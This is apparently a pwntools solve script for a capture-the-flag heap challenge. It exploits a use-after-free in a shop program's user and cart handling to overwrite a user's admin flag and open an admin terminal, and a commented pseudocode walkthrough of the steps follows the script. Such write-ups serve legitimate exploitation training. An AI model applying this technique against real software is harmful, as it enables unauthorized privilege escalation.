import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

#r = remote(HOST, int(PORT))

r = process("../challenge/src/challenge")

def send_menu(choice: int):
    r.sendlineafter(b"Choice:", str(choice).encode())


def login(username: str, password: str):
    send_menu(3)
    r.sendlineafter(b"Username: ", username.encode())
    r.sendlineafter(b"Password: ", password.encode())


def logout():
    send_menu(5)


def create_user(username: str, password: str):
    send_menu(2)
    r.sendlineafter(b"Username: ", username.encode())
    r.sendlineafter(b"Password: ", password.encode())


def add_item(index: int):
    send_menu(2)
    r.sendlineafter(b"Item: ", str(index).encode())


def remove_item(index: int):
    send_menu(3)
    r.sendlineafter(b"Item: ", str(index).encode())

def checkout():
    send_menu(4)

def admin_terminal():
    send_menu(7)


create_user("user1", "user1pass")
add_item(0)
remove_item(0)
logout()
create_user("user2", "user2pass")
logout()
login("user1", "user1pass")
checkout()
add_item(4)
logout()
login("Egg", "egg.")
admin_terminal()
r.interactive()

"""
    User* user1 = create_user("user1", "user1pass");

    add_item(&ITEMS[0]);
    remove_item(0);
    logout();
    // user2 gets allocated at cart->items;
    User* user2 = create_user("user2", "user2pass");
    logout();
    // Switch back to user1
    login("user1", "user1pass");
    // Free user2
    checkout();
    // Add item to set admin flag of user2 to 1
    add_item(&ITEMS[4]);

    // We clobbered user2's info but login anyway
    login(ITEMS[4].name, ITEMS[4].desc);

    admin_terminal();
"""
